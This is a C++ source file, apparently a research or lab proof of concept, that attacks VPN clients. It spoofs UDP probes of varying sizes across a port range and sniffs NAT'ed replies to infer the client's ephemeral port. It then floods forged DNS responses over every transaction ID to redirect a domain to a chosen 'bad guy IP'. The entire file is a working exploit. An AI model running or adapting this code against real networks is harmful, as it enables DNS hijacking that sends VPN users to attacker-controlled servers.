#include <tins/tins.h>
#include <cassert>
#include <iostream>

#include <string>
#include <unistd.h>
#include <thread>
#include <random>



using std::thread;
using std::cout;
using std::string;
using std::vector;
using namespace Tins;



int current_spoof_port, best_port, chack_count, resp_count, sniff_size;
bool is_running = true;
bool verbose = true;
bool count_resp = false;


bool scanning = false;
bool injecting = false;
bool sniffed_resp = false;
string dest_ip;
string source_ip;




void print_start() {
  cout << "meep\n";
  usleep(1000000 / 2);
  cout << "meep\n";
  usleep(1000000 /2);
  cout << R"(

                                    __
                                   /  \      __
       .---.                  _   /   /   _.~  \
       \    `.               / \ /   /.-~    __/
        `\    \              |  |   |/    .-~ __
          \    \             |  |   |   .'--~~  \
           \    \            |  |   `  ' _______/
            \    \           |  `        /
        .--. \    \          |    `     /
        \   `.\    \          \        /
         `\   \     \          `\     (
           \   \     \           > ,-.-.
            \   `.    \         /  |  \ \
             \    .    \       /___| O |O\     ,
          .-. \    ;    |    /`    `^-.\.-'`--'/
          \  `;         |   |                 /
           `\  \        |   `.     `--..____,'
             \  `.      |     `._     _.-'^
              \   .     /         `|`|`
            .-.\       /           | |
            \  `\     /            | |
             `\  `   |             | |
               \     |             | |
              .-.    |             | |
              \  `.   \            | |
               `\      \           | |
                 \      \          | |
                  \_____ :-'~~~~~'-' ;
                  /____;``-.         :
                 <____(     `.       ;
                   \___\     ;     .'
                      /``--'~___.-'
                     /\___/^/__/
                    /   /' /`/'
                    \  \   `\ \
                     `\ \    \ \
                       \ \    \ \
                        \ \    \ \
                         \ \    \ \     ______
                          \ \ ___\ \'~``______)>
                           \ \___ _______ __)>
                       _____\ \'~``______)>
                     <(_______.._______)>


)";
  usleep(1000000);

}
void print_divider(int count) {
  int i = 0;
  while (i < count) {
    if (verbose) cout << "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
    i++;
  }
}

void print_time() {
  int res = system("date");

}

// Used by thread to keep track of last port
// we spoofed to
//
bool handle_send_packet(PDU &some_pdu) {

  const IP &ip = some_pdu.rfind_pdu<IP>(); // Grab IP layer of sniffed packet

  if (ip.src_addr() == source_ip) current_spoof_port = some_pdu.rfind_pdu<UDP>().dport();

  return is_running;

}


// Used by sniffing thread to look for packets
// NAT'ed back to the client that we may have
// spoofed
//
bool handle_packet(PDU &some_pdu) {

  const IP &ip = some_pdu.rfind_pdu<IP>(); // Grab IP layer of sniffed packet

  // should be looking for a packet from the VPN server and to the VPN client
  //
  // src ip will be the VPN server and dest ip will be the public address
  // of the VPN client


  if (ip.src_addr() == dest_ip && !injecting) { // dest_ip should be public VPN IP

    const uint32_t& payload = some_pdu.rfind_pdu<RawPDU>().payload_size();

    //cout << "sniffed packet going from VPN server with port: " << current_spoof_port << ", size: " << payload << " \n";

    // BEGIN: Bens edits 
    // 97 is the size of empty UDP packet NAT'ed back to the client so only look for packets that are bigger
    // TOOD: Mess with the sniff_size constant subtracted from the payload (originally 97, now 40)
    if (payload >= 97 && payload != 147) { // could be a NAT'ed attacker packet

      if (verbose) cout << "sniffed response from VPN server with port: " << current_spoof_port << ", size: " << payload << " \n";

      best_port = current_spoof_port;
      sniff_size = payload - 50;

      sniffed_resp = true;
      if (count_resp) resp_count ++;
      // END: Bens edits

    }

  }


  return is_running;
}


// Start sniffing things on one of the
// attack router interfaces 
//
void sniff_stuff() {
  SnifferConfiguration config;
  config.set_promisc_mode(true);
  Sniffer sniffer("enp0s8", config);
  sniffer.sniff_loop(handle_packet);

}


// Sniff outgoing interface for packets we send
// to get a better approx of the last packet sent
//
void sniff_send_stuff() {

  SnifferConfiguration config;
  config.set_promisc_mode(true);
  Sniffer sniffer("any", config);
  sniffer.sniff_loop(handle_send_packet);

}


// Generate random string of some length to send
// in attack probes
//
std::string random_string(std::size_t length) {

  const std::string CHARACTERS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

  std::random_device random_device;
  std::mt19937 generator(random_device());
  std::uniform_int_distribution<> distribution(0, CHARACTERS.size() - 1);

  string random_string;

  for (std::size_t i = 0; i < length; ++i) {
    random_string += CHARACTERS[distribution(generator)];
  }

  return random_string;
}


// Spread udp packets across a given port
// range while increasing the size each time
//
int port_spread(string source_ip, int sport, string dest_ip, int start_port, int end_port) {

  PacketSender sender;
  NetworkInterface iface("enp0s8");

  IP pkt = IP(dest_ip, source_ip) / UDP(40409, sport);
  UDP& udp = pkt.rfind_pdu<UDP>();

  int current_port = best_port;
  int spoof_port = start_port;

  int send_size = 0;

  int send_count = 0;
  string send_payload = random_string(send_size);

  cout << "spreading the port range from " << start_port << " to " << end_port << " with udps..\n";

  while (spoof_port < end_port && !sniffed_resp) {

    IP pkt = IP(dest_ip, source_ip) / UDP(spoof_port, sport) / RawPDU(send_payload);
    current_spoof_port = spoof_port;

    int round_sends = 0;
    while (round_sends < 4) { // send 4 at a time then sleep again
      IP pkt = IP(dest_ip, source_ip) / UDP(spoof_port, sport) / RawPDU(send_payload);

      udp.dport(spoof_port);
      current_spoof_port = spoof_port;
      sender.send(pkt, iface);
      spoof_port++;
      send_size ++;
      round_sends ++;
      send_payload = random_string(send_size);

      if (send_size >= 1000) { // reset probe size back to 0 on every 1000th port
        send_size = 0;
        if (verbose) cout << "Sent w size 1000 to " << spoof_port << "\n";
      }

    }
    // if the payload size reaches 1000 (max), reset back to 0
    if (send_size >= 1000) {
      send_size = 0;
      if (verbose) cout << "Sent w size 1000 to " << spoof_port << "\n";
    }

    usleep(25); // scan send delay *** working w 30 before
  }

  if (!sniffed_resp) usleep(1000000 / 3); // wait a third of a second just in case it was at the very top of the port range (i.e. ~61k)

  current_port = best_port;
  if (verbose) cout << "finished round 1 w guessed port: " << current_port << "\n";
  if (verbose) cout << "size of round 1 response: " << sniff_size << "\n";

  if (!sniffed_resp) current_port = 0;

  return current_port;
}



// Send to the range of approximate ports
// again with different sizes to find the exact
// one in use
//
int find_exact_port(int block_port, int last_port, int last_size, string source_ip, int sport, string dest_ip) {
  
  // Using the size of the first round response we know we're within
  // about 16 ports of the exact one in use but because of the delay it
  // could be in one of a few different 1k blocks

  PacketSender sender;
  NetworkInterface iface("enp0s8");

  int block_start = block_port - 5000 + last_size; // BEN: changed to 5k as in the paper.start 10 thousand blocks back plus the sniff size
  int spoof_port = block_start - 3;
  int max_port  = spoof_port + 16; // only check 16 ports in each thousand block
  
  int send_size = 0;
  int current_port = 0;
  string send_payload = random_string(0);
  sniffed_resp = false;

  IP pkt = IP(dest_ip, source_ip) / UDP(40409, sport);
  UDP& udp = pkt.rfind_pdu<UDP>();

  while (!sniffed_resp && spoof_port < (block_port + 1000)) {

    send_payload = random_string(send_size);
    IP pkt = IP(dest_ip, source_ip) / UDP(spoof_port, sport) / RawPDU(send_payload);
    current_spoof_port = spoof_port;
    udp.dport(spoof_port); // set the packets dest port to current guess

    if (verbose) cout << "sending to port: " << (spoof_port) << " w size: " << send_size << "\n";

    sender.send(pkt, iface);
    spoof_port++;
    send_size += 5;

    if (spoof_port > max_port) {
      spoof_port += (1000 - 17); // jump to the next thousand block
      max_port = spoof_port + 16;
    }
    usleep(2000);
  }

  while (!sniffed_resp) {
    usleep(500000);
    if (verbose) cout << "waiting for round 2 resp..\n";
  }

  current_port = best_port;
  if (verbose) cout << "size of round 2 response: " << sniff_size << "\n";


  if (verbose) print_divider(2);
  bool found = false;

  // Go over the exact same loop as round 2 without sending
  // until we find the port that would have triggered the size
  // that was sniffed

  spoof_port = block_start - 3;
  max_port  = spoof_port + 16;
  send_size = 0;

  while (!found && spoof_port < (block_port + 1000)) {

    if (send_size > sniff_size) {
      // we just passed the port that matched the connection
      if (verbose) cout << "port on size match: " << spoof_port << "\n";
      current_port = spoof_port;
      found = true;
    }

    spoof_port++;
    send_size += 5;

    if (spoof_port > max_port) {
      spoof_port += (1000 - 17);
      max_port = spoof_port + 16;
    }
  }


  // Do one final scan within +-3 ports of approx to make sure
  // we have the exact port in use

  int start_port = current_port - 3;
  spoof_port = start_port;
  max_port = spoof_port + 6;
  send_size = 0;
  sniffed_resp = false;

  while (!sniffed_resp && spoof_port < max_port)  {

    send_payload = random_string(send_size);
    IP pkt = IP(dest_ip, source_ip) / UDP(spoof_port, sport) / RawPDU(send_payload);
    current_spoof_port = spoof_port;
    udp.dport(spoof_port); // set the packets dest port to current guess

    if (verbose) cout << "sending final round spoof to port: " << (spoof_port) << " w size: " << send_size << "\n";

    sender.send(pkt, iface);
    spoof_port += 1;
    send_size += 240;
  }


  while (!sniffed_resp) {
    usleep(500000);
    if (verbose) cout << "waiting for final exact scan resp..\n";
  }

  current_port = best_port;
  if (verbose) cout << "size of final exact response: " << sniff_size << "\n";

  int exact = start_port + (sniff_size / 240);
  //cout << "FINAL EXACT PORT: " << exact << "\n\n";

  return exact + 1;
}



// Spread udp packets across a port range to find the estimated
// port in use that forwards packet back to the client, then repeat the
// scan in the estimated range to find the exact one in use
//
int scan_for_port(string source_ip, int sport, string dest_ip, int start_port, int end_port) {

  PacketSender sender;
  NetworkInterface iface("enp0s8");
  int i;

  // Find the estimated port
  scanning = true;
  int current_port = port_spread(source_ip, sport, dest_ip, start_port, end_port);
  scanning = false;

  if (current_port == 0) return 0;

  int j  = 0;
  int exact_port = 0;

  if (verbose) print_divider(2);
  sniffed_resp = false;
  cout << "estimated port: " << current_port << " w sniff size: "  << sniff_size << "\n";

  int last_port = current_port;
  int block_port = last_port;

  while (block_port % 1000 != 0) {
    block_port --;
  }

  if (verbose) cout << "highest port block: " << block_port << "\n";

  // Find the exact port in use
  int exact = find_exact_port(block_port, last_port, sniff_size, source_ip, sport, dest_ip);
  if (verbose) cout << "some exact port? " << exact << "\n";
  exact_port = exact;

  return exact_port;

}


// Not used now but could be added to recheck X times that a 
// port is truly in use and forwarding packets back to the client
//
int recheck_port(int num_checks, int approx_port, string source_ip, int sport, string dest_ip) {


  PacketSender sender;
  NetworkInterface iface("enp0s8");

  IP pkt = IP(dest_ip, source_ip) / UDP(40409, sport); /// RawPDU("long message here actually a whole lot longer than the other one");
  UDP& udp = pkt.rfind_pdu<UDP>();

  bool is_found = false;
  int curr_port = approx_port - 1;

  while (!is_found){

    cout << "rechecking port: " << curr_port << "\n";

    udp.dport(curr_port); // set the packets dest port to current guess

    for (int i = 0; i < num_checks; i ++) {
      sender.send(pkt, iface);
      usleep(1000);
    }

    if (resp_count == num_checks) {
      is_found = true;
    } else {
      curr_port ++;;
      usleep(300000);
    }
  }

  int final_port = best_port;
  int other_final = curr_port - 1;
  cout << "maybe better final approx? " << other_final << "\n";

  return final_port;
}


// Attempt to inject the dns response to the given 4 tuple (src_ip, sport, dest_ip, dport)
// while cycling through all possible txIDs for the dns reply
int send_dns(string src_ip, int sport, string dest_ip, int dport) {

  PacketSender sender;
  NetworkInterface iface("enp0s8");

  IP pkt = IP(dest_ip, src_ip) / UDP(dport, sport) / DNS();

  cout << "Attempting to inject dns response on port " << dport << "\n\n";

  //string spoof_domain = "yo.com"; // twatter.com
  string spoof_domain = "www.fartbook.com"; // twatter.com
  // string redirect_ip = "22.22.22.22";
  string redirect_ip = "192.168.2.2";

  // This needs to be the same IP as the VPN server for the connection
  // to get routed back to the victim

  injecting = true;

  // Add the fake response
  pkt.rfind_pdu<DNS>().add_query({ spoof_domain, DNS::A, DNS::IN });
  pkt.rfind_pdu<DNS>().add_answer(
    DNS::resource(
      spoof_domain,
      redirect_ip, // some bad guy IP we wanna redirect to
      DNS::A,
      1, // class of the record??
      // 777 is just a random TTL
      777
    )
  );
  // We want the query to be resolverd recursively
  pkt.rfind_pdu<DNS>().type(DNS::QRType::RESPONSE);
  pkt.rfind_pdu<DNS>().recursion_desired(1);
  pkt.rfind_pdu<DNS>().recursion_available(1);


  int round_sends = 0;
  int id = 1;
  int num_blocks = 6;
  int block_size = int(65535 / num_blocks); // 65535 is max transaction id for dns 


  while (id < block_size) { // try every txId in the block

    int send_id = id;

    while (round_sends < num_blocks) { // send once to each block
      pkt.rfind_pdu<DNS>().id(send_id); // set the transaction id guess
      sender.send(pkt, iface);
      send_id += block_size;
      round_sends ++;
    }

    if (id % 1000 == 0) cout << "sending dns response w id: " << id << "\n";
    id ++;
    round_sends = 0;

    usleep(100); // was working 100% w 250
  }


  return 1;

}



int find_ports(string source_ip, int sport, string dest_ip, int start_port, int end_port) {

  bool is_found = false;
  int current_port = 0;

  int last_port = start_port;

  while (!is_found) {

    sniffed_resp = false;
    print_time();

    int exact_port = scan_for_port(source_ip, sport, dest_ip, last_port, end_port);
    print_divider(2);

    if (exact_port == 0) is_found = true;
    else {
      cout << "found exact port: " << exact_port << "\n\n";
      print_time();

      send_dns(source_ip, sport, dest_ip, exact_port);
      usleep(1000000);
      injecting = false;
    }
    resp_count = 0;
    print_divider(1);


    int next_port = exact_port + 2;

    while (next_port % 1000 != 0) {
      next_port ++;
    }

    last_port = next_port;

  }

  return 1;

}



int main(int argc, char** argv) {

  if (argc != 6) {
    cout << "sike wrong number of args ---> (source_ip, sport, dest_ip, start_port, end_port)\n";
    return 0;
  }

  source_ip = argv[1]; // dns server IP
  int sport = atoi(argv[2]); // most likely 53
  dest_ip = argv[3]; // vpn server IP
  //verbose = true;

  int start_port = atoi(argv[4]); // Linux ephemeral range is (32768, 60999)
  int end_port = atoi(argv[5]);

  print_divider(2);

  thread sniff_thread(sniff_stuff);
  thread send_sniff_thread(sniff_send_stuff);

  int res = find_ports(source_ip, sport, dest_ip, start_port, end_port);

  sniff_thread.detach();
  send_sniff_thread.detach();

  return 1;
}
